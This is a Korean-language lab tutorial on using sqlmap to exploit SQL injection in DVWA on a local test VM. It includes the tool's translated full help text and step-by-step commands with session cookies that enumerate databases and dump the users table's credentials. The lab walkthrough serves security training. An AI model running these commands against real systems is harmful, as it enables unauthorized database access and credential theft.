# 간단한 실습을 통한 sqlmap 사용법
##### 원작자: 문광일 PM
##### 링크: [KOROMOON][koromoonlink]
[koromoonlink]: https://koromoon.blogspot.com/2020/07/sqlmap.html "Go koromoon"
##### 작성자: 강하늘 사원
##### 작성일자: 2024년 4월 15일 



보통 SQL Injection 공격은 다음과 같은 순서로 공격 시도함.
취약한 URL 파라미터 찾기 > DB > 테이블 > 컬럼 순으로 정보를 찾아서 최종적으로 데이터 추출을 목적으로 함.
참고로 상용 어플리케이션(WordPress, Joomla 등) 취약점 같은 경우 이미 공개된 PoC 관련 한 줄 짜리 SQL Injection 코드를 이용하여 데이터를 추출함.

sqlmap 을 이용하여 DB > 테이블 > 컬럼 순으로 SQL Injection 공격 시도 후 데이터 추출을 목적으로 테스트하고자 함.
테스트 환경은 아래와 같음.

■ 테스트 환경

공격자 : Kali Linux 2020.2a 버전 VMware Image (IP : 192.168.100.130)

피해자 : OWASP Broken Web Apps VM v1.2 이미지의 Dam Vulnerable Web Applicaion 웹 사이트 (IP : 192.168.100.131)

공격시도 URL : http://192.168.100.131/dvwa/vulnerabilities/sqli/?id=koromoon&Submit=Submit#

sqlmap 버전 : 1.4.4#stable 버전

기타 정보 : DVWA 로그인 인증(admin/admin) 후에 공격 시도가 가능하므로 세션이 맺은 상태에서 공격 시도해야 함. 

그래서 sqlmap 에서 --cookie 옵션을 설정하여 공격 시도함. 쿠키값 확인은 Wireshark 툴을 이용하여 DVWA 로그인 인증(admin/admin) 후에 패킷덤프에서 쿠키값을 확인할 수 있음. 

※ OWASP Broken Web Apps VM v1.2 이미지 다운로드 : https://sourceforge.net/projects/owaspbwa/

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165739282/d9904d2f-8e2a-437a-bcf2-470bfb05f0ae)

< 공격시도 URL 정보 >


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165739282/b5f9fc03-08d4-4e5c-b317-33f964f49900)

< 공격시도 URL 접근 패킷덤프 - 쿠키값 확인 >



( 1 ) 도움말 보기

sqlmap -hh 명령어를 입력하면 상세한 도움말 메시지를 확인할 수 있음.
(sqlmap 1.4.4#stable 버전에서 확인하였으며 한글 번역함)
아래 출력된 도움말 메시지 중에서 빨간색 옵션들을 자주 사용하므로 숙지할 것!



root@kali:/home/kali# sqlmap -hh
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.4#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

사용법 : python3 sqlmap [options]

옵션 :
  -h, --help            기본 도움말 메시지 표시 및 종료
  -hh                   고급 도움말 메시지 표시 및 종료
  --version             프로그램 버전 번호 표시 및 종료
  -v VERBOSE            상세 수준 : 0-6 (기본값 1)

대상 : 대상(복수 가능)을 정의하려면 이러한 옵션 중 하나 이상을 제공해야 함.

    -u URL, --url=URL   대상 URL (e.g. "hxxp://www.koromoon.com/vuln.php?id=1")
    -d DIRECT           직접 데이터베이스 연결을 위한 연결 문자열
    -l LOGFILE          Burp 또는 WebScarab 프록시 로그 파일에서 대상(다수 포함) 구문 분석
    -m BULKFILE         텍스트 파일에서 제공된 여러 대상 스캔
    -r REQUESTFILE      파일로부터 HTTP Request 로드
    -g GOOGLEDORK       Google dork 결과를 대상 URL(다수 포함) 로 처리
    -c CONFIGFILE       구성 INI 파일로부터 옵션(다수 포함) 로드

요청 : 이 옵션을 사용하여 대상 URL에 연결하는 방법을 지정할 수 있음.

    -A AGENT, --user..  HTTP User-Agent 헤더값
    -H HEADER, --hea..  추가 헤더 (e.g. "X-Forwarded-For: 127.0.0.1")
    --method=METHOD     주어진 HTTP 메소드 강제 사용 (e.g. PUT)
    --data=DATA         POST 방식을 통해 전송될 데이터 문자열 (e.g. "id=1")
    --param-del=PARA..  매개 변수값을 분할하는 데 사용되는 문자 (e.g. &)
    --cookie=COOKIE     HTTP 쿠키 헤더값 (e.g. "PHPSESSID=a8d127e..")
    --cookie-del=COO..  쿠키값(다수 포함)을 분할하는 데 사용되는 문자 (e.g. ;)
    --load-cookies=L..  Netscape/wget 형식의 쿠키(다수 포함)가 포함된 파일
    --drop-set-cookie   응답에서 Set-Cookie 헤더 무시
    --mobile            HTTP User-Agent 헤더를 통해 스마트폰 모방
    --random-agent      임의로 선택된 HTTP 사용자 에이전트 헤더값 사용
    --host=HOST         HTTP Host 헤더값
    --referer=REFERER   HTTP Referer 헤더값
    --headers=HEADERS   추가 헤더(다수 포함) (e.g. "Accept-Language: fr\nETag: 123")
    --auth-type=AUTH..  HTTP 인증 유형 (Basic, Digest, NTLM or PKI)
    --auth-cred=AUTH..  HTTP 인증 자격 증명 (name:password)
    --auth-file=AUTH..  HTTP 인증 PEM 인증키/개인키 파일
    --ignore-code=IG..  (문제가 있는) HTTP 오류 코드 무시 (e.g. 401)
    --ignore-proxy      시스템 기본 프록시 설정 무시
    --ignore-redirects  리다이렉션 시도 무시
    --ignore-timeouts   연결 시간초과 무시
    --proxy=PROXY       프록시를 사용하여 대상 URL에 연결
    --proxy-cred=PRO..  프록시 인증 자격 증명(다수 포함) (name:password)
    --proxy-file=PRO..  파일로부터 프록시 목록 로드
    --tor               Tor 익명 네트워크 사용
    --tor-port=TORPORT  기본이 아닌 Tor 프록시 포트 설정
    --tor-type=TORTYPE  Tor 프록시 유형 설정 (HTTP, SOCKS4 or SOCKS5 (기본값))
    --check-tor         Tor 가 올바르게 사용되는지 확인
    --delay=DELAY       각 HTTP 요청 사이의 초 단위 지연
    --timeout=TIMEOUT   시간 종료 연결 전 대기 시간(초) (default 30)
    --retries=RETRIES   연결 시간이 초과되면 다시 시도 (default 3)
    --randomize=RPARAM  주어진 매개 변수(다수 포함)의 값을 임의로 변경
    --safe-url=SAFEURL  테스트 중에 자주 방문할 URL 주소
    --safe-post=SAFE..  안전한 URL 로 보낼 POST 데이터
    --safe-req=SAFER..  파일로부터 안전한 HTTP 요청 로드
    --safe-freq=SAFE..  안전한 URL 방문 사이의 정기적인 요청
    --skip-urlencode    페이로드 데이터의 URL 인코딩 스킵
    --csrf-token=CSR..  Anti-CSRF 토큰을 보유하는 데 사용되는 매개 변수
    --csrf-url=CSRFURL  Anti-CSRF 토큰 추출을 위해 방문할 URL 주소
    --csrf-method=CS..  Anti-CSRF 토클 페이지 방문 중에 사용할 HTTP 메소드
    --force-ssl         SSL/HTTPS 사용 강제
    --chunked           HTTP chunked 전송 인코딩(POST) 요청 사용
    --hpp               HTTP 매개 변수 오염(pollution) 메소드 사용
    --eval=EVALCODE     요청 전에 제공된 Python 코드 평가 (e.g. "import hashlib;id2=hashlib.md5(id).hexdigest()")

최적화 : 이 옵션은 sqlmap 성능을 최적화하는 데 사용할 수 있음.

    -o                  모든 최적화 스위치를 켬
    --predict-output    일반적인 쿼리 출력 예측
    --keep-alive        지속적인 HTTP(다수 포함) 연결 사용
    --null-connection   실제 HTTP 응답 본문 없이 페이지 길이 검색
    --threads=THREADS   최대 동시 HTTP(다수 포함) 요청 수 (default 1)

주입(Injection) : 이 옵션을 사용하여 테스트할 매개 변수를 지정하고, 사용자 지정 주입(Injection) 페이로드 및 선택적 변조 스크립트를 제공할 수 있음.

    -p TESTPARAMETER    테스트 가능한 매개 변수(다수 포함)
    --skip=SKIP         주어진 매개 변수(다수 포함)에 대한 테스트 스킵
    --skip-static       동적으로 보이지 않는 테스트 매개 변수 스킵
    --param-exclude=..  테스트로부터 매개 변수(다수 포함)를 제외시키는 정규식 (e.g. "ses")
    --param-filter=P..  장소(place) 별로 테스트 가능한 매개 변수 선택 (e.g. "POST")
    --dbms=DBMS         백엔드 DBMS 를 제공된 값으로 강제 실행
    --dbms-cred=DBMS..  DBMS 인증 자격 증명 (user:password)
    --os=OS             백엔드 DBMS 운영체제를 제공된 값으로 강제 실행
    --invalid-bignum    값 무효화하기 위해 큰 숫자 사용
    --invalid-logical   값 무효화에 논리 연산 사용
    --invalid-string    값 무효화하기 위해 임의의 문자열 사용
    --no-cast           페이로드 캐스팅 메커니즘 끄기
    --no-escape         문자열 이스케이프 메커니즘 끄기
    --prefix=PREFIX     페이로드 접두사 문자열 주입
    --suffix=SUFFIX     페이로드 접미사 문자열 주입
    --tamper=TAMPER     주입 데이터 변조를 위해 지정된 스크립트(다수 포함) 사용

탐지 : 이 옵션을 사용하여 탐지 단계를 사용자 정의(customize)를 할 수 있음.

    --level=LEVEL       수행할 테스트 수준 (1-5, default 1)
    --risk=RISK         수행할 테스트 위험 (1-3, default 1)
    --string=STRING     쿼리가 True 로 평가될 때 일치하는 문자열
    --not-string=NOT..  쿼리가 False 로 평가될 때 일치하는 문자열
    --regexp=REGEXP     쿼리가 True 로 평가될 때 일치하는 정규식
    --code=CODE         쿼리가 True 로 평가될 때 일치하는 HTTP 코드
    --smart             긍정적인 휴리스틱(다수 포함)인 경우에만 철저한 테스트 수행
    --text-only         텍스트 내용만을 기준으로 페이지 비교
    --titles            제목만 기준으로 페이지 비교

기법 : 이 옵션은 특정 SQL Injection 기술 테스트를 조정하는 데 사용할 수 있음.

    --technique=TECH..  사용할 SQL Injeciton 기법 (default "BEUSTQ")
    --time-sec=TIMESEC  DBMS 응답을 지연시키는 시간(초) (default 5)
    --union-cols=UCOLS  UNION 쿼리 SQL Injection 을 테스트할 컬럼 범위
    --union-char=UCHAR  무차별 대입할 컬럼 수를 사용할 문자
    --union-from=UFROM  UNION 쿼리 SQL Injection 의 FROM 부분에서 사용할 테이블
    --dns-domain=DNS..  DNS 유출 공격에 사용되는 도메인 명
    --second-url=SEC..  결과 페이지 URL 에서 2차 응답 검색
    --second-req=SEC..  파일으로부터 2차 HTTP 요청 로드

핑거프린트(Fingerprint) :
    -f, --fingerprint   광범위한 DBMS 버전 핑거프린트(fingerprint) 수행

열거 : 이 옵션은 테이블에 포함된 백엔드 데이터베이스 관리 시스템 정보, 구성 및 데이터를 열거하는 데 사용할 수 있음.

    -a, --all           모든 것 검색
    -b, --banner        DBMS 배너 검색
    --current-user      DBMS 현재 사용자 검색
    --current-db        DBMS 현재 데이터베이스 검색
    --hostname          DBMS 서버 호스트명 검색
    --is-dba            DBMS 현재 사용자가 DBA 인지 감지
    --users             DBMS 사용자 열거
    --passwords         DBMS 사용자 비밀번호 해시 열거
    --privileges        DBMS 사용자 권한 열거
    --roles             DBMS 사용자 역할 열거
    --dbs               DBMS 데이터베이스 열거
    --tables            DBMS 데이터베이스 테이블 열거
    --columns           DBMS 데이터베이스 테이블 컬럼 열거
    --schema            DBMS 스키마 열거
    --count             테이블(다수 포함) 항목 수 검색
    --dump              DBMS 데이터베이스 테이블 항목 덤프
    --dump-all          모든 DBMS 데이터베이스 테이블 항목 덤프
    --search            컬럼(다수 포함), 테이블(다수 포함) 또는(and/or) 데이터베이스명(다수 포함) 검색
    --comments          열거 중인 DBMS 주석 확인
    --statements        DBMS에서 실행 중인 SQL 문(다수 포함) 검색
    -D DB               열거할 DBMS 데이터베이스
    -T TBL              열거할 DBMS 데이터베이스 테이블(다수 포함)
    -C COL              열거할 DBMS 데이터베이스 테이블 컬럼(다수 포함)
    -X EXCLUDE          열거하지 않을 DBMS 데이터베이스 식별자(다수 포함)
    -U USER             열거할 DBMS 사용자
    --exclude-sysdbs    테이블을 열거할 때 DBMS 시스템 데이터베이스(다수 포함) 제외
    --pivot-column=P..  피벗(pivot) 열 이름
    --where=DUMPWHERE   테이블 덤프 중 WHERE 조건절 사용
    --start=LIMITSTART  검색할 첫 번째 덤프 테이블 항목
    --stop=LIMITSTOP    검색할 마지막 덤프 테이블 항목
    --first=FIRSTCHAR   검색할 첫 번째 쿼리 출력 단어 문자
    --last=LASTCHAR     검색할 마지막 쿼리 출력 단어 문자
    --sql-query=SQLQ..  실행할 SQL 문
    --sql-shell         대화식 SQL 쉘 프롬프트
    --sql-file=SQLFILE  주어진 파일(다수 포함)에서 SQL 문 실행

무차별 대입(Brute force) : 이 옵션은 무차별 대입 검사를 실행하는 데 사용할 수 있음.

    --common-tables     공통 테이블 유무 확인
    --common-columns    공통 컬럼 유무 확인
    --common-files      공통 파일 유무 확인

사용자 정의 함수 주입(Injection) : 이 옵션은 일반적인(custom) 사용자 정의 함수를 생성하는 데 사용할 수 있음.

    --udf-inject        일반적인 사용자 정의 함수 주입
    --shared-lib=SHLIB  공유 라이브러리의 로컬 경로

파일 시스템 액세스 : 이 옵션은 백엔드 데이터베이스 관리 시스템 기본 파일 시스템에 액세스하는데 사용할 수 있음.

    --file-read=FILE..  백엔드 DBMS 파일 시스템으로부터 파일 읽기
    --file-write=FIL..  백엔드 DBMS 파일 시스템에 로컬 파일 쓰기
    --file-dest=FILE..  쓸(to write to) 백엔드 DBMS 절대 경로

운영 체제 액세스 : 이 옵션은 백엔드 데이터베이스 관리 시스템 기본 운영체제에 액세스하는데 사용할 수 있음.

    --os-cmd=OSCMD      운영체제 명령어 실행
    --os-shell          대화식 운영체제 쉘 프롬프트
    --os-pwn            OOB 쉘, Meterpreter, VNC 프롬프트
    --os-smbrelay       OOB 쉘, Meterpreter, VNC 에 대한 프롬프트 한번 클릭
    --os-bof            저장 프로시저 버퍼 오버플로우 악용
    --priv-esc          데이터베이스 프로세스 사용자 권한 에스컬레이션
    --msf-path=MSFPATH  Metasploit 프레임워크가 설치된 로컬 경로
    --tmp-path=TMPPATH  임시 파일 디렉토리의 원격 절대 경로

윈도우 레지스트리 액세스 : 이 옵션은 백엔드 데이터베이스 관리 시스템 윈도우 레지스트리에 액세스하는데 사용할 수 있음.

    --reg-read          윈도우 레지스트리 키값 읽기
    --reg-add           윈도우 레지스트리 키값 데이터 쓰기
    --reg-del           윈도우 레지스트리 키값 삭제
    --reg-key=REGKEY    윈도우 레지스트리 키
    --reg-value=REGVAL  윈도우 레지스트리 키값
    --reg-data=REGDATA  윈도우 레지스트리 키값 데이터
    --reg-type=REGTYPE  윈도우 레지스트리 키값 유형

일반 : 이 옵션은 일반적인 작업 매개 변수를 설정하는 데 사용할 수 있음.

    -s SESSIONFILE      저장된 파일(.sqlite)에서 세션 로드
    -t TRAFFICFILE      모든 HTTP 트래픽을 텍스트 파일로 기록
    --answers=ANSWERS   사전 정의된 답변 설정 (e.g. "quit=N,follow=N")
    --batch             사용자 입력을 요구하지 않고 기본 동작을 사용
    --binary-fields=..  이진 값을 가진 결과 필드 (e.g. "digest")
    --check-internet    대상을 평가하기 전에 인터넷 연결을 확인
    --cleanup           sqlmap 특정 UDF 및 테이블에서 DBMS 정리
    --crawl=CRAWLDEPTH  대상 URL에서 시작하여 웹사이트 크롤링
    --crawl-exclude=..  크롤링에서 페이지를 제외하는 정규식 (e.g. "logout")
    --csv-del=CSVDEL    CSV 출력에 사용되는 구분 문자 (default ",")
    --charset=CHARSET   블라인드 SQL Injection 문자셋 (e.g. "0123456789abcdef")
    --dump-format=DU..  덤프된 데이터의 형식 (CSV (default), HTML or SQLITE)
    --encoding=ENCOD..  데이터 검색에 사용되는 문자 인코딩 (e.g. GBK)
    --eta               예상 도착 시간을 각각 출력해서 표시
    --flush-session     현재 대상의 세션 파일을 반영(flush)
    --forms             대상 URL에서 양식 분석 및 테스트
    --fresh-queries     세션 파일에 저장된 쿼리 결과값 무시
    --gpage=GOOGLEPAGE  지정된 페이지 번호로부터 Google dork 결과값 사용
    --har=HARFILE       모든 HTTP 트래픽을 HAR 파일에 기록
    --hex               데이터 검색 중 16진수 변환 사용
    --output-dir=OUT..  사용자 정의 출력 디렉토리 경로
    --parse-errors      응답으로부터 DBMS 에레 메시지 구문 분석 및 표시
    --preprocess=PRE..  응답 데이터의 전처리에 지정된 스크립트(다수 포함) 사용
    --repair            알 수 없는 문자 마커(?)가 있는 항목 재덤프(Redump)
    --save=SAVECONFIG   구성 INI 파일에 옵션(다수 포함) 저장
    --scope=SCOPE       대상 필터링을 위한 정규식
    --skip-waf          WAF/IPS 보호의 휴리스틱(heuristic) 탐지 스킵
    --table-prefix=T..  임시 테이블에 사용되는 접두사 (default: "sqlmap")
    --test-filter=TE..  페이로드 및(and/or) 제목별로 테스트 선택 (e.g. ROW)
    --test-skip=TEST..  페이로드 및(and/or) 제목별로 테스트 스킵 (e.g. BENCHMARK)
    --web-root=WEBROOT  웹서버 문서 루트 디렉토리 (e.g. "/var/www")

기타(Miscellaneous) : 이 옵션은 다른 범주에 맞지 않음.

    -z MNEMONICS        짧은 니모닉 사용 (e.g. "flu,bat,ban,tec=EU")
    --alert=ALERT       SQL Injection 시도가 발견되면 호스트 OS 명령어(다수 포함) 실행
    --beep              SQL Injection 시도가 발견되면 질문 및 / 에 대한 경고음
    --dependencies      누락된(선택적) sqlmap 종속성 점검 체크
    --disable-coloring  콘솔 출력 컬러링(coloring) 비활성화
    --list-tampers      사용 가능한 임의 스크립트 목록 표시
    --offline           오프라인 모드에서 작업 (세션 데이터만 사용)
    --purge             sqlmap 데이터 디렉토리에서 모든 컨텐츠를 안전하게 제거
    --results-file=R..  다중 대상 모드에서 CSV 결과값 파일의 위치
    --sqlmap-shell      대화식 sqlmap 쉘에 대한 프롬프트
    --tmp-dir=TMPDIR    임시 파일을 저장하기 위한 로컬 디렉토리
    --unstable          불안정한 연결 옵션 조정
    --update            sqlmap 업데이트
    --wizard            초보자를 위한 간단한 마법사 인터페이스



( 2 ) DB 정보 알아내기

기본 명령어 형식 : sqlmap -u URL -p 파라미터명 (선택사항 --cookie=쿠키값) --dbs
사용예 : sqlmap -u "http://192.168.100.131/dvwa/vulnerabilities/sqli/?id=koromoon&Submit=Submit#" -p id --cookie="security=low; PHPSESSID=300fgn00aunr01ejf32u9io0u6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" --dbs


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165739282/86525517-3ff0-4aa5-a50d-3a32a2a10c6a)

< 명령어 입력 >


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165739282/effdaddf-a27e-4c1c-97b9-b80a136f82d0)

< 결과값 출력 >



( 3 ) 지정된 DB 에서 테이블 정보 알아내기

기본 명령어 형식 : sqlmap -u URL -p 파라미터명 (선택사항 --cookie=쿠키값) -D 데이터베이스명 --tables
사용예 : sqlmap -u "http://192.168.100.131/dvwa/vulnerabilities/sqli/?id=koromoon&Submit=Submit#" -p id --cookie="security=low; PHPSESSID=300fgn00aunr01ejf32u9io0u6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" -D dvwa --tables


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165739282/57994ce2-2243-4a59-a17b-02b759fde467)
< 명령어 입력 >


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165739282/c4489f30-74a1-4a8f-b05f-f7e705abd9be)
< 결과값 출력 >



( 4 ) 지정된 DB 에 속한 테이블에서 컬럼 정보 알아내기

기본 명령어 형식 : sqlmap -u URL -p 파라미터명 (선택사항 --cookie=쿠키값) -D 데이터베이스명 -T 테이블명 --columns
사용예 : sqlmap -u "http://192.168.100.131/dvwa/vulnerabilities/sqli/?id=koromoon&Submit=Submit#" -p id --cookie="security=low; PHPSESSID=300fgn00aunr01ejf32u9io0u6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" -D dvwa -T users --columns


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165739282/f517bf72-6f72-45f1-b82f-71066f23fd97)

< 명령어 입력 >


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165739282/ed810065-4db1-472f-9030-c0523572b22f)

< 결과값 출력 >



( 5 ) 지정된 DB 에 속한 테이블의 전체 데이터 덤프하기

기본 명령어 형식 : sqlmap -u URL -p 파라미터명 (선택사항 --cookie=쿠키값) -D 데이터베이스명 -T 테이블명 --dump
사용예 : sqlmap -u "http://192.168.100.131/dvwa/vulnerabilities/sqli/?id=koromoon&Submit=Submit#" -p id --cookie="security=low; PHPSESSID=300fgn00aunr01ejf32u9io0u6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" -D dvwa -T users --dump

명령어 입력 후 도중에 Y 나 Enter 눌러서 진행함.​
덤프된 파일은 sqlmal 툴 -> output 폴더 -> IP or URL 폴더 -> dump 폴더 안에 생성됨.
(ex. /home/kali/.sqlmap/output/192.168.100.131/dump)


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165739282/fa9a69d3-b889-41d3-833c-e056650cdbf3)

< 명령어 입력 >


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165739282/0a33dcfa-a009-4d99-88b9-8378ef08987d)

< 결과값 출력 >



( 6 ) 지정된 DB 에 속한 테이블의 특정 컬럼 덤프하기

기본 명령어 형식 : sqlmap -u URL -p 파라미터명 (선택사항 --cookie=쿠키값) -D 데이터베이스명 -T 테이블명 -C "컬럼명(복수 가능)" --dump
사용예 : sqlmap -u "http://192.168.100.131/dvwa/vulnerabilities/sqli/?id=koromoon&Submit=Submit#" -p id --cookie="security=low; PHPSESSID=300fgn00aunr01ejf32u9io0u6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" -D dvwa -T users -C "user,password" --dump

명령어 입력 후 도중에 Y 나 Enter 눌러서 진행함.​
덤프된 파일은 sqlmal 툴 -> output 폴더 -> IP or URL 폴더 -> dump 폴더 안에 생성됨.
(ex. /home/kali/.sqlmap/output/192.168.100.131/dump)

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165739282/a9492e7f-58ba-450e-bdfa-08d53f0c5e04)

< 명령어 입력 >


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165739282/532ae9ad-86d2-4bfa-b5e4-15b18b9aec55)

< 결과값 출력 >



